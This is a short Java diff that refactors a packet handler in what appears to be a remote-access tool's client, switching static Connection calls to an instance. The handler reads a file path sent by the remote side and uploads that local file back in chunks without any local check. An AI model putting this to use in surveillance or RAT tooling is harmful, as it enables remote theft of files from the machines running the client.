@@ -13,25 +13,25 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		final File file = new File(Connection.readLine());
+		final File file = new File(Connection.instance.readLine());
 
 		if (file.exists() && file.isFile()) {
 			new Thread(new Runnable() {
 				public void run() {
 					try {
-						Connection.addToSendQueue(new Packet30BeginClientUpload(file));
+						Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));
 
 						FileInputStream fileInput = new FileInputStream(file);
 						byte[] chunk = new byte[1024 * 8];
 
 						for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
 							int read = fileInput.read(chunk);
-							Connection.addToSendQueue(new Packet29ClientUploadPart(file, chunk, read));
+							Connection.instance.addToSendQueue(new Packet29ClientUploadPart(file, chunk, read));
 							Thread.sleep(100L);
 						}
 						fileInput.close();
 						
-						Connection.addToSendQueue(new Packet31CompleteClientUpload(file));
+						Connection.instance.addToSendQueue(new Packet31CompleteClientUpload(file));
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
